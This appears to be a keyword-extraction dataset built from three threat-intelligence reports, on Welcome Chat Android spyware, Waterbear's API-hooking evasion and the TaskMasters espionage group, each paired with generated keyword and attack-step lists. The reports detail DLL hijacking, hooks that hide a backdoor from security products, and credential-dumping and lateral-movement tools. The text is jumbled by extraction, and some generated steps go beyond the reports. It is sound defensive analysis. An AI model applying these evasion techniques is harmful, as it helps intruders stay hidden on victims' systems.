the attackers; its app; Google Play; the malicious Welcome Chat app; users; the malware; messages; contacts; Record; audio; the chat; the device; commands; communications; the C&C server; the attack; information; additional permissions; the malware; espionage; data; the device.,"['1. Threat actors create the Welcome Chat spyware app and distribute it outside the official Google Play store, promoting it as a secure messaging app. 2. Targets download and install Welcome Chat from a website in Arabic. 3. Welcome Chat requests intrusive permissions from victims needed for its chat functionality. 4. The app covertly collects and exfiltrates extensive data like messages, contacts, location to a command and control server. 5. Collected data is found unsecured on the server, freely accessible to anyone. 6. Threat actors likely access the server to collect stolen data for espionage purposes. 7. New versions of the Welcome Chat spyware continue to be distributed for updated surveillance on targets. ']","Extract the keywords: 7/16/2020Welcome Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityWelcome Chat as a secure messaging app? Nothing could be further from the truthwelivesecurity.com/2020/07/14/welcome-chat-secure-messaging-app-nothing-further-truthJuly 14, 2020We discovered a new operation within a long-running cyber-espionage campaign in the Middle East. Targeting Android users via the malicious Welcome Chat app, the operation appears to have links to the malware named BadPatch, which MITRE links to the Gaza Hackers threat actor group known also as Molerats.Our analysis shows that the Welcome Chat app allows spying upon its victims. However, it is not simple spyware. Welcome Chat is a functioning chat app that delivers the promised functionality along with its hidden espionage capacity.We found this spyware being advertised to chat-hungry users (these apps are banned in some countries in the Middle East region) on a dedicated website (see Figure 1). The fact that the website is in Arabic conforms with the targeting of the whole campaign we believe this operation belongs to. The domain was registered in October 2019; we couldn’t, however, determine when the website was launched.Figure 1. The website of the malicious Welcome Chat appurl Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityThe malicious website promotes the Welcome Chat app, claiming it’s a secure chat platform that is available on the Google Play store. Both claims are false. In regard to the “secure” claim, nothing is further from the truth. Not only is Welcome Chat an espionage tool; on top of that, its operators left the data harvested from their victims freely available on the internet. And the app was never available on the official Android app store.Figure 2. Despite the caption stating “High quality, secure and available on Google Play”, the buttonleads to the installation file being downloaded directly from the malicious websiteFunctionality/AnalysisOnce the user downloads the app, it needs the setting “Allow installing apps from unknown sources” to be activated since the app was not downloaded from the Play Store.After installation, the malicious app will request the victim to allow permissions such as send and view SMS messages, access files, record audio, and access contacts and device location. Such an extensive list of intrusive permissions might normally make the victims suspicious – but with a messaging app, it’s natural they are needed for the app to deliver the promised functionality.url Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityFigure 3. Permission requests by Welcome Chat spywareIn order to be able to communicate with other users of this app, the user needs to register and create a personal account (see Figure 4).url Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityFigure 4. The Sign up/Login dialog of the Welcome Chat appImmediately after receiving these permissions, Welcome Chat sends information about the device to its C&C and is ready to receive commands. It is designed to contact the C&C server every five minutes.On top of its core espionage functionality – monitoring the chat communications of its users – the Welcome Chat app can perform the following malicious actions: exfiltrating sent and received SMS messages, call log history, contact list, user photos, recorded phone calls, the GPS location of the device, and device info.Trojanized or attacker-developed chat app?url Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityAn interesting question arises with functional trojan apps: is the app an attacker- trojanized version of a clean app, or did the attackers develop a malicious app from scratch?In both cases, it is easy for the attackers to spy on exchanged in-app messages as they would – naturally – have the authorization keys to the user database.Despite the first option being typical for trojanized apps, we believe that in this particular case, the second explanation is more probable.Typically, trojanized apps are created via a process of appending the malicious functionality to a legitimate app. The bad guys find and download a suitable app. After decompiling it, they add the malicious functionality and recompile the now-malicious- yet-still-functioning app to spread it among their desired audience.There is a major question mark with this option: to this day, we have not been able to discover any clean version of the Welcome Chat app. Not only can it not be found on any of the Android markets we have on our radar; based on the binary matching algorithms in our sample classification systems, we haven’t found any clean app with this same chat functionality. Of interest in this regard is that a clean version of Welcome Chat, without the espionage functionality, was uploaded to VirusTotal in mid-February 2020 (hash: submitted to VirusTotal a week earlier.This leads us to believe that the attackers developed the malicious chat app on their own. Creating a chat app for Android is not difficult; there are many detailed tutorials on the internet. With this approach, the attackers have better control over the compatibility of the app’s malicious functionality with its legitimate functions, so they can ensure that the chat app will work.Code analysisThe Welcome Chat espionage app seems to have targeted Arabic-speaking users: both the default website language and default in-app language are Arabic. However, based on debug logs left in the code, strings, class and unique variable names, we were able to determine that most of the malicious code was copied from publicly available open source code projects and code example snippets available on public forums.url Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityFigure 5. The developer used different pieces of open source code to create the malicious appIn some cases, the copied open source code is quite old – see Table 1. As a possible explanation, all the listed examples come at the very top among the results of simple googling for the respective functionalities.url Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityTable 1. The origins of the malicious codeFunctionalitySourceAge (years)Call recordingSMS stealingopen source, GitHubopen source, GitHub86Google Maps coordinates open source, Blogspot (plus other sources) 5GEO trackingGPS trackingUser data leakopen source, GitHubopen source, GitHub85The Welcome Chat app, including its infrastructure, was not built with security in mind. The app uploads all of the user’s stolen data to the attacker-controlled server via unsecured HTTP.Transmitted data is not encrypted and because of that, not only it is available to the attacker, it is freely accessible to anyone on the same network.The database contains data such as name, email, phone number, device token, profile picture, messages and friends list – in fact, all the users’ data except for the account passwords can be found uploaded to the unsecured server.Figure 6. The victim’s device uploads the user data to the app’s serverurl Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityFigure 7. User database leakFigure 8. Leaked user infoFigure 9. An example of an in-app message being freely accessible on the app’s unsecured serverOnce we discovered the sensitive information as being publicly accessible, we intensified our efforts to discover the developer of the legitimate chat app (i.e., the app the espionage tool was – eventually – a trojanized version of) to disclose the vulnerability to them. Weurl Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityfound neither the developer nor the app, convincing us that the app was built from the beginning as malicious. Naturally, we made no effort to reach out to the malicious actors behind the app.Possible BadPatch connectionThe Welcome Chat espionage app belongs to the very same Android malware family that we identified at the beginning of 2018. That malware used the same C&C server, pal4u.net, as the espionage campaign targeting the Middle East that was identified in late 2017 by Palo Alto Networks and named BadPatch. In late 2019, Fortinet described yet another espionage operation focused on Palestinian targets with the domain pal4u.net among its indicators of compromise.For these reasons we believe that this campaign with new Android trojans comes from the threat actors behind the long-term BadPatch campaign.RecommendationWhile the Welcome Chat-based espionage operation seems to be narrowly targeted, we strongly recommend that users don’t install any apps from outside the official Google Play store – unless it’s a trusted source such as a website of an established security vendor or some reputable financial institution. On top of that, users should pay attention to what permissions their apps require and be suspicious of any apps that require permissions beyond their functionality – and, as a very basic security measure, run a reputable security app on their mobile devices.Indicators of Compromise (IoCs)HashESET detection nameC60D7134B05B34AF08023155EAB3B38CEDE4BCCDAndroid/Spy.Agent.ALYC755D37D6692C650692F4C637AE83EF6BB9577FCAndroid/Spy.Agent.ALY89AB73D4AAF41CBCDBD0C8C7D6D85D21D93ED199 Android/Spy.Agent.ALY2905F2F60D57FBF13D25828EF635CA1CCE81E757Android/Spy.Agent.ALYC&C: emobileservices.clubMITRE ATT&CK techniquesTacticIDNameDescriptionurl Chat as a secure messaging app? Nothing could be further from the truth | WeLiveSecurityTacticIDNameDescriptionT1444 Masqueradeas Legiti- mate ApplicationWelcome Chat impersonates a legitimate chat application.T1402 App Auto- Start at De- vice BootWelcome Chat listens for the BOOT_COMPLETED broadcast, ensuring that the app's functionality will be activated every time the device starts.Initial tionT1426 System In- TrackingT1433 Access CallLogT1432 Access Con-tact ListT1429 CaptureAudioT1533 Data fromLocal SystemWelcome Chat collects information about the device.Welcome Chat exfiltrates sent and received SMS messages.Welcome Chat spies on the device's location.Welcome Chat exfiltrates call log history.Welcome Chat exfiltrates the user contact list.Welcome Chat records surrounding audio.Welcome Chat steals user photos stored on device.Welcome Chat uploads exfiltrated data using the HTTP protocol.Com- 14 Jul 2020 - 11:30AMNewsletterurl ","{'phrases': ['Threat actors', 'the Welcome Chat', 'Chat spyware', 'the official Google Play store', 'a secure messaging app', 'targets', 'a website', 'Arabic', 'intrusive permissions', 'victims', 'the app', 'exfiltrates', 'messages', 'contacts', 'location', 'anyone', 'stolen data'], 'target': 'Threat actors; the Welcome Chat; Chat spyware; the official Google Play store; a secure messaging app; targets; a website; Arabic; intrusive permissions; victims; the app; exfiltrates; messages; contacts; location; anyone; stolen data.'}"
Waterbear; DLL loader; decrypt; the payload; RC4; additional modules; the attacker; the service; IP; detection.,"["" 1. A malicious DLL loader is used to load the encrypted Waterbear payloads. 2. The first payload injects API hooking code into a targeted security product process. 3. The API hooking code hides the malware's presence by manipulating the ZwOpenProcess and GetExtendedTcpTable APIs. 4. The second payload is a typical Waterbear backdoor that communicates with command and control servers. ""]","Extract the keywords: 12/12/2019Waterbear is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogSearch:Home CategoriesHome » Malware » Waterbear is Back, Uses API Hooking to Evade Security Product DetectionWaterbear is Back, Uses API Hooking to Evade Security Product DetectionPosted on:December 11, 2019 at 5:04 am Posted in:Malware Author: Trend Micro0By Vickie Su, Anita Hsieh, and Dove Chiu Waterbear, which has been around for several years, is a campaign that uses modular malware capable of including additional functions remotely. It is associated with the cyberespionage group BlackTech, which mainly targets technology companies and government agencies in East Asia (speciﬁcally Taiwan, and in some instances, Japan and Hong Kong) and is responsible for some infamous campaigns such as PLEAD and Shrouded Crossbow. In previous campaigns, we’ve seen Waterbear primarily being used for lateral movement, decrypting and triggering payloads with its loader component. In most cases, the payloads are backdoors that are able to receive and load additional modules. However, in one of its recent campaigns, we’ve discovered a piece of Waterbear payload with a brand-new purpose: hiding its network behaviors from a speciﬁc security product by API hooking techniques. In our analysis, we have discovered that the security vendor is APAC-based, which is consistent with BlackTech’s targeted countries. Knowing which speciﬁc APIs to hook might mean that the attackers are familiar with how certain security products gather information on their clients’ endpoints and networks. And since the API hooking shellcode adopts a generic approach, a similar code snippet might be used to target other products in the future and make Waterbear harder to detect. A closer look at Waterbear Waterbear employs a modular approach to its malware. It utilizes a DLL loader to decrypt and execute an RC4-encrypted payload. Typically, the payload is the ﬁrst- stage backdoor which receives and loads other executables from external attackers. These ﬁrst-stage backdoors can be divided into two types: First, to connect to a command-and-control (C&C) server, and second, to listen in on a speciﬁc port. Sometimes, the hardcoded ﬁle paths of the encrypted payloads are not under Windows native directories (e.g., under security products or third-party libraries’ directories), which may indicate that the attackers might have prior knowledge of their targets’ environments. It is also possible that the attackers use Waterbear as a secondary payload to help maintain presence after gaining some levels of access to the targets’ systems. The evidence is that Waterbear frequently uses internal IPs as its own C&C servers (for The typical Waterbear infection chainurl is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogFigure 1. A typical Waterbear infection chainA Waterbear infection starts from a malicious DLL loader, as shown in Figure 1. We have seen two techniques of DLL loader triggering. One is modifying a legitimate server application to import and load the malicious DLL loader, while the second technique is performing phantom DLL hijacking and DLL side loading. Some Windows services try to load external DLLs with hardcoded DLL names or paths during boot-up. However, if the DLL is a legacy DLL (i.e., one that is no longer supported by Windows) or a third-party DLL (i.e., one that is not part of the original Windows system DLLs), attackers can give their malicious DLL a hardcoded DLL name and place it under one of the searched directories during the DLL loading process. After the malicious DLL is loaded, it will gain the same permission level as the service that loads it. During our recent Waterbear investigation, we discovered that the DLL loader loaded two payloads. The payloads performed functionalities we have never seen in other Waterbear campaigns. The ﬁrst payload injects code into a speciﬁc security product to hide the campaign’s backdoor. The second payload is a typical Waterbear ﬁrst-stage backdoor, which we will attempt to dissect ﬁrst based on a speciﬁc case we observed during our analysis. Waterbear’s ﬁrst-stage backdoor We saw a Waterbear loader named “ociw32.dll” inside one of the folders in the %PATH% environmental variable. This DLL name is hardcoded inside “mtxoci.dll” which is loaded by the MSDTC service during boot-up. “mtxoci.dll” ﬁrst tries to query the registry key “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI” to see if the value “OracleOciLib” exists. If so, it retrieves the data inside it and loads the corresponding library. If the value doesn’t exist, “mtxoci.dll” tries to load “ociw32.dll” instead. During our investigation, we noticed that the value “OracleOciLib” was deleted from the victim’s machine, as shown in Figure 2. Hence, the malicious loader “ociw32.dll” was loaded and successfully executed on the host.Figure 2. The deleted value “OracleOciLib” on the victim’s hostNote: The image on the left shows how the DLL on a normal machine normally looks. The image on the right showcases how the DLL on a victim’s machine appears. Because there is no “OracleOciLib” value, it loads the hardcoded DLL “ociw32.dll” instead, which triggers the malicious Waterbear DLL loader. After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode. The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key. If the decrypted payload is valid, it picks a speciﬁc existing Windows Service — LanmanServer, which is run by svchost.exe — and injects the decrypted shellcode into the legitimate service. In most cases, the payload is a ﬁrst-stage backdoor, and its main purpose is to retrieve second-stage payloads — either by connecting to a C&C server or opening a port to wait for external connections and load incoming executables. Conﬁguration of the ﬁrst-stage backdoor Waterbear’s ﬁrst-stage backdoor conﬁguration contains the information required for the proper execution of and communication with external entities.Offset 0x00, Size 0x10: Encryption / decryption key for the functions Offset 0x10, Size 0x04: 0x0BB8 (reserved)url is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogOffset 0x14, Size 0x10: Version (e.g., 0.13, 0.14, 0.16, and so on) Offset 0x24, Size 0x10: Mutex or reserved bytes Offset 0x34, Size 0x78: C&C server address which is XOR-encrypted by key 0xFF. If the backdoor is intended to listen in on a speciﬁc port, this section will be ﬁlled with 0x00. Offset 0xAC, Size 0x02: Port Offset 0xAE, Size 0x5A: Reserved bytes Table: The function address table of the payload. The block is initially ﬁlled with 0x00 and will be propagated during runtime. Table: The sizes of functions Table: The API address table. The block is initially ﬁlled with 0x00 and will be ﬁlled with loaded API addresses during runtime. Table: The API hashes for dynamic API loading A list of DLL names and the number of APIs to be loadedFigure 3. The ﬁrst-stage backdoor’s conﬁguration structureAnti-memory scanning of shellcode payload In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine. Afterwards, whenever it needs to use a function, it will decrypt the function, execute it, and encrypt the function back again, as can be seen in Figure 4. If a function will not beurl used on the rest of the execution, it will be scrambled by another mess-up function, as illustrated in Figure 6. The mess-up function muddles up the bytes with random values and makes the input blocks unrecoverable. The purpose of this is to further avoid being detected by a certain cybersecurity solution.Waterbear is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogFigure 4. The decryption-execution-encryption ﬂow in the shellcode execution routineFigure 5. The function for the function block encryption and decryptionFigure 6. The payload’s mess-up functionSame Waterbear, different story During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we’ve previously seen. This time, the DLL loader loaded two payloads – the ﬁrst payload performed functionalities we have not seen before: It injected codes into a speciﬁc security product to do API hooking in order to hide the backdoor from the product. Meanwhile, the second payload is a typical Waterbear ﬁrst-stage backdoor.url is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogFigure 7. An unusual Waterbear infection chainBoth payloads were encrypted and stored on the victim’s disk and were injected into the same service, which was, in this case, LanmanServer. We have observed that the loader tried to read the payloads from the ﬁles, decrypted them, and performed thread injections with the following conditions:1. If the ﬁrst payload could not be found on the disk, the loader would be terminated without loading the second one. 2. If the ﬁrst payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to 3. In the ﬁrst injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing otherthe ﬁrst thread. malicious routines. Note that only the thread would be terminated, but the service would still be running.Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded. API hooking to evade detection In order to hide the behaviors of the ﬁrst-stage backdoor (which is the second payload), the ﬁrst payload uses API hooking techniques to avoid being detected by a speciﬁc security product and to make an interference in the result of the function execution. It hooks two different APIs, namely “ZwOpenProcess” and “GetExtendedTcpTable”, to hide its speciﬁc processes. The payload only modiﬁes the functions in the memory of the security product process, hence the original system DLL ﬁles remain unchanged. The payload is composed of a two-stage shellcode. The ﬁrst-stage shellcode ﬁnds a speciﬁc security product’s process with a hardcoded name and injects the second- stage shellcode into that process. The second-stage shellcode then performs API hooking inside the targeted process. Hiding process identiﬁers (PIDs) The process identiﬁers or PIDs to be hidden are stored in the shared memory “Global\<computer_name>.” If the shared memory doesn’t exist, it takes the PID embedded by the ﬁrst-stage shellcode. In this case, the intention of the malicious code is to hide Waterbear’s backdoor activities from the security product. Therefore, the ﬁrst-stage shellcode takes the PID of the Windows Service — which the ﬁrst-stage shellcode and the succeeding backdoor both inject into — hides the target process, and embeds that PID into the second-stage shellcode.Figure 8. Code that injects current PID into the second-stage shellcodeHooking “ZwOpenProcess” in ntdll.dll The purpose of hooking “ZwOpenProcess” is to protect the speciﬁc process from being accessed by the security product. Whenever “ZwOpenProcess” is called, the injected code will ﬁrst check if the opened process hits any PIDs in the protected process ID list. If yes, it modiﬁes the process ID, which should open on another Windows Service PID. First, it builds the hooked function and writes the function at the end of “ntdll.dll”. This function includes two parts, as shown in Figure 9:1. The PID checking procedure. It recursively checks if the PID to be opened by “ZwOpenProcess” is in the list of the protected process IDs. If yes, it replaces 2. After the PID checking procedure, it executes the original “ZwOpenProcess” and returns the result.the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning.url is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence Blog Figure 9. The function hook of “ZwOpenProcess” to check and modify the output of the functionSecondly, it writes “push <ADDRESS> ret” at the beginning of the original “ZwOpenProcess” address. Hence, when “ZwOpenProcess” is called, the modiﬁed version of “ZwOpenProcess” will be executed.Figure 10. “ZwOpenProcess” after modiﬁcationThe API hooking on “ZwOpenProcess” will only be triggered if “%temp%\KERNELBASE.dll” exists on the host. It is possible that this check is designed according to the nature of the security product it targets. “GetExtendedTcpTable” and “GetRTTAndHopCount” hooks in iphlpapi.dll The second part of API hooking hooks on “GetExtendedTcpTable.” “GetExtendedTcpTable” is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat. The purpose of the hook is to remove TCP endpoint records of certain PIDs. In order to achieve that, it modiﬁes two functions: “GetExtendedTcpTable” and “GetRTTAndHopCount.” The second function, “GetRTTAndHopCount,” acts as the place to put the injected hooking code. “GetExtendedTcpTable” only writes a jump to “GetRTTAndHopCount” in the beginning of the function. Only the ﬁrst 5 bytes of the code of the API “GetExtendedTcpTable” are changed, as shown in Figure 11.The rest of the routine is all placed in “GetRTTAndHopCount.” In the ﬁrst part of the code, it pushes [“GetRTTAndHopCount”+0x3E] as the return address and then executes the ﬁrst four instructions of the original “GetExtendedTcpTable” function (which has already been replaced by the jump instruction in Figure 11). After that, it jumps to “GetExtendedTcpTable” to execute the function normally and to catch its return values. The code is shown in Figure 12.Figure 11. Only 5 bytes changed in the “GetExtendedTcpTable”Figure 12. The ﬁrst part of injected code in “GetRTTAndHopCount,” which executes “GetExtendedTcpTable” and returns back to the next instructionAfter “GetExtendedTcpTable” is executed and the process returns back to the second part of the code, it iteratively checks every record in the returned Tcp table. If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records. In the end, it returns the modiﬁed table.url is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogFigure 13. The ﬁrst part of injected code in “GetRTTAndHopCount,” which executes “GetExtendedTcpTable” and returns back to the next instructionRather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difﬁcult, especially since both functions still work and return results normally. Although in this case, the affected process is speciﬁed in the ﬁrst-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors’ products. Conclusion This is the ﬁrst time we’ve seen Waterbear attempting to hide its backdoor activities. By the hardcoded product name, we infer that the attackers are knowledgeable of the victims’ environment and which security product(s) they use. The attackers might also be familiar with how security products gather information on their clients’ endpoints and networks, so that they know which APIs to hook. Since the API hooking shellcode adopts a generic approach, the similar code snippet might be used to target other products in the future and make the activities of Waterbear harder to detect.TacticTechniqueExecution through Module LoadExecution through APIHookingProcess InjectionHookingBinary PaddingExecutionPersistencePrivilege EscalationDefense EvasionDisabling Security ToolsT1089url loads the DLLs through the shellcodeDynamically loads the APIs through the shellcodeID T1179Hooks security product’s commonly used APIs Injects the decrypts payload into svchost.exe process Hooks security products’ commonly used APIsT1055 T1009 Adds junk data to evade anti-virus scan Targets a speciﬁc security product’s process for injection purposes12/12/2019Waterbear is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence BlogDeobfuscate/Decode Files or Information Execution GuardrailsDLL Side-LoadingT1140 Uses TROJ_WATERBEAR to T1480 Targets speciﬁc software in the T1073decrypt encrypted payload victim’s environment Uses modiﬁed legitimate DLL to load the malicious DLL Injects the decrypted payload into svchost.exe process Possibly sends collected data to attackers via C&C channelExﬁltrationProcess Injection Exﬁltration Over Command and Control ChannelT1055 BKDR_WATERBEAR.ZTGF BKDR_WATERBEARENC.ZTGDLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE»SMALL BUSINESS»HOME»Tags: API HookingBlackTechWaterbear0 CommentsTrendLabsRecommendt Tweet f ShareStart the discussion…LOG IN WITHOR SIGN UP WITH DISQUS?Login1 Sort by BestBe the ﬁrst to comment.SubscribeAdd Disqus to your siteAdd DisqusAddd✉ Featured Storiesurl is Back, Uses API Hooking to Evade Security Product Detection - TrendLabs Security Intelligence Blogsystemd Vulnerability Leads to Denial of Service on Linux qkG Filecoder: Self-Replicating, Document-Encrypting Ransomware Mitigating CVE-2017-5689, an Intel Management Engine Vulnerability A Closer Look at North Korea’s Internet From Cybercrime to CyberpropagandaSecurity Predictions for 2019Our security predictions for 2019 are based on our experts’ analysis of the progress of current and emerging technologies, user behavior, and market trends, and their impact on the threat landscape. We have categorized them according to the main areas that are likely to be affected, given the sprawling nature of the technological and sociopolitical changes under consideration. Read our security predictions for 2019.Business Process CompromiseAttackers are starting to invest in long-term operations that target speciﬁc processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more, read our Security 101: Business Process Compromise.Recent PostsWaterbear is Back, Uses API Hooking to Evade Security Product Detection December Patch Tuesday: Vulnerabilities in Windows components, RDP, and PowerPoint Get Fixes Obfuscation Tools Found in the Capesand Exploit Kit Possibly Used in “KurdishCoder” Campaign Mobile Cyberespionage Campaign Distributed Through CallerSpy Mounts Initial Phase of a Targeted Attack Operation ENDTRADE: Finding Multi-Stage Backdoors that TICKPopular PostsMac Backdoor Linked to Lazarus Targets Korean Users New Magecart Attack Delivered Through Compromised Advertising Supply Chain September Patch Tuesday Bears More Remote Desktop Vulnerability Fixes and Two Zero-Days Microsoft November 2019 Patch Tuesday Reveals 74 Patches Before Major Windows Update Banking Trojan DRIDEX Uses Macros for InfectionStay Updated Email SubscriptionHome and Home Ofﬁce About Trend Micro Asia Paciﬁc Region (APAC): Australia / New Zealand, , ⽇, 대한민국,  Latin America Region (LAR): Brasil, México North America Region (NABU): United States, Canada Europe, Middle East, & Africa Region (EMEA): France, Deutschland / Österreich / Schweiz, Italia, Россия, España, United Kingdom / Ireland Copyright © 2019 Trend Micro Incorporated. All rights reserved.url ","{'phrases': ['a malicious DLL loader', 'Waterbear payload', 'First', 'code', 'the API hooking', 'Malware', 'presence', 'ZwOpenProcess', 'TCP', 'Table', 'APIs', 'the second payload', 'Command', 'Control'], 'target': 'a malicious DLL loader; Waterbear payload; First; code; the API hooking; Malware; presence; ZwOpenProcess; TCP; Table; APIs; the second payload; Command; Control.'}"
attackers; access; their targets; email; the group; servers; lateral movement; the network; exploits; the group; browsers; credentials; the group; attribution; the attack.,"[' 1. Gain initial access through spearphishing, exploits, etc. 2. Use tools like Mimikatz and pwdump to extract credentials from compromised hosts 3. Move laterally with AtNow utility to run commands on other hosts 4. Use RemShell backdoor for command and control 5. Exfiltrate data with custom utilities or web shells 6. Maintain persistence using scheduled tasks, services, additional backdoors 7. Pivot to further systems using collected credentials 8. Target critical servers and systems like domain controllers 9. Use encryption, custom protocols, etc. to evade detection ']","Extract the keywords: in the digital economy ageptsecurity.comIntroduction In the course of cyberincident investigations and threat analysis research, Positive Technologies experts have identified activity by a criminal group whose aims include theft of confidential documents and espionage. In this report, we will pay a close look at the tools, techniques, and procedures employed by the group as well as share indi- cators of compromise for detecting attacks.Objectives The main objective of the group is to steal confidential information. The attackers at- tempt to burrow into corporate information systems for extended periods and obtain access to key servers, executive workstations, and business-critical systems.At one of the attacked companies, the earliest traces of the group's presence on infra- structure dated to 2010. Since the group had obtained full control of some servers and workstations by that time, the initial breach must have occurred much earlier.Most of the attacked companies relate to manufacturing and industry. In total we are aware of compromise of over 30 companies and organizations in various sectors, including: Manufacturing and industry  Science and technology  Systems integration Software development  Geology  Transport and logistics  Real estate  ConstructionThe group attacked companies in a number of countries. A significant number of their targets were located in Russia and the CIS.2Attribution Identified by the PT Expert Security Center in 2018, the group used an unusual method for lateral movement on network infrastructure: creation of tasks in the Task Scheduler. As a result, the group has been dubbed TaskMasters.The GitHub code of the ASPXSpy2014 web shell, which was used in the attack process, contains references to Chinese developers (see Figure 1). However, the version we dis- covered instead contains a reference to google.ru.Figure 1. ASPXSpy: public version vs. version used in attackThe requests sent to the web shells contained IP addresses belonging to a hosting pro- vider and printing house in Eastern Europe. However, the event log of the proxy server at one of the attacked organizations captured the moment when the attackers switched to uted on Chinese-language web forums.3Figure 3. WinRAR license key published on Chinese-language forumsOne of the tasks made use of the domain Brengkolang.com, which had been regis- tered through a Chinese registrar.Figure 4. Information about Brengkolang.comMany of the utilities contain error messages and other debugging information in bro- ken English. This would be consistent with English being a second language for the developers.4Figure 5. Error messages written in broken EnglishIn addition, some of the attackers' self-developed utilities contain the string ""by AiMi"". This artifact is present both in client backdoors and server components.Figure 6. Reference to the developers in script interfaceIn a previous report, we noted that demand for malware development on the darkweb significantly exceeds supply.1 As a result, malware is increasingly available to anyone willing to pay.Growing malware supply has pushed cybercriminals to use ready-made tools, which significantly complicate attack attribution.1 ptsecurity.com/ww-en/analytics/darkweb-2018/5If different cybercriminals use the same services, they could be mistakenly thought to be in the same group. The same problem applies to determining the attackers' country. Code comments in any particular language only mean that the malware was created by a speaker of that language, who may have sold it afterward. Phishing messages, which may have been written sloppily, are also problematic for attribution. The bottom line is that surefire identification is possible only when attackers use exclusive exploits and malware.Methods The overall attack vector is rather traditional. After reaching the local network, the at- tackers study the infrastructure, exploit system vulnerabilities (such as CVE-2017-0176), and then download a particular toolkit to compromised hosts and unpack it (we will call the toolkit TaskMasters, the same name as for the group itself). With this toolkit, they search for, copy, and archive files of interest. The files are then sent to command and control (C2) servers.For lateral movement on the network, the attackers run system commands on remote hosts via the AtNow utility, which enables running software and commands at preset intervals of time. For managing hosts, they use small backdoors, which are used to connect to C2 servers. Backup communication methods exist as well, in the form of web shells on external resources (such as an Exchange server).STAGE 1. Attack on workstations Payoff for attackers:  User credentialsSTAGE 2. Attack on domain controllers Payoff for attackers: Privileged account credentials Ease and stealth in lateral movement   User credentialsSTAGE 3. Attack on file, database, and application servers Payoff for attackers: Sensitive documents  User credentialsSTAGE 4. Attack on servers and workstations of executives, IT and security staff Payoff for attackers: Full compromise of network Knowledge of infrastructure and cybersecurity solutions in place  User credentialsFigure 7. Attack scheme6The group uses Dynamic DNS infrastructure for its domains. It also makes active use of supply chain attacks.To scan the network and compromise systems, the attackers use both software available freely online (such as NBTScan, pwdump, and Mimikatz) and custom-developed utilities. At this point, we will proceed to describe the TaskMasters arsenal in more detail.Tools The following tables are a compilation of information about software used by the group. Utilities developed by the group itself have been listed in a separate table.Table 1. Custom-developed TaskMasters softwareDESCRIPTIONMain malware for remote command execution on infected hosts. Key features: Running commands on a host in the form cmd.exe /c <command> with function call CreateProcessA and sending of results to the C2 server Sending of attacker-specified files to server  Downloading of files from serverUtility for viewing files on accessible remote network resources with username and password.Utility for copying files by means of direct disk access. Can even copy files that are blocked by other processes.Utility for installing and removing services. Alternative to the system utility sc.exe.Utility for extracting emails from Personal Storage Table (*.pst) files, which are used by Microsoft Exchange Client, Windows Messaging, and Microsoft Outlook.NAMERemShellGetDirFCopyService utilityPst utilityEnumLogonSession utilityUtility for listing active user sessions on a local host.TimestampChangeHTTP pingUtility for changing the timestamp of the indicated file to equal the timestamp of %WINDIR%\System32\kernel32.dll. Designed to complicate investigators' search for forensic artifacts.Utility for checking the HTTP accessibility of a resource from remote computers. Interfaces with remote machines via scheduled tasks and shared network resourcesLoggedOnUsersUtility for getting the list of users who are currently logged in.Redirect portsUtility for redirecting network connections from a certain host and TCP port combination to a different one. In effect, a primitive proxy server.HostUserListUtility for enumerating users on a network host.TFSZBWIPCS404-input-shell (web shell)Utility for uploading files to a C2 server.Utility for capturing network traffic. Records all captured traffic in PCAP format.Utility for copying a specified file to a remote shared network resource.Web shells for running commands based on .NET. Running system commands  Downloading files to server  Uploading files from server  Authenticating with MD5 hash (detailed in the text of this report)7NAME*AtNowpwdumpgsecdumpEXAMPLES OF USE*APT18 FIN5DESCRIPTIONTable 2. Publicly available softwareUtility for creating local or remote scheduled tasks, which run within 70 seconds of being scheduled. Main utility used by the attackers for lateral movement. Part of the utility suite from NirSoft.These utilities are intended for extracting the LM or NTLM hashes of account passwords in Windows (SAM). Most of the code for these programs is open-source and freely available.APT1 TG-3390 (APT27)Utility for extracting password hashes from SAM and Active Directory. Freely distributed.HTranAPT27Utility for redirecting traffic from the specified port of the current host to a particular port on another host. In effect, acts as a SOCKS proxy server. Freely distributed.NBTScanTG-3390Scanner for detecting openly accessible NetBIOS name servers on the local TCP/IP network, which allows finding accessible network shares on hosts.RARASPXSpy2014 (web shell)APT1 TG-3390TG-3390APT1 (web shell)WinRAR. Used for packing, both to stage collected information on the target infrastructure and to send this information to the attackers' server.Capabilities of this feature-rich web shell include: Authentication with MD5 hash Running of system commands Running of WMI queries Self-removal Process 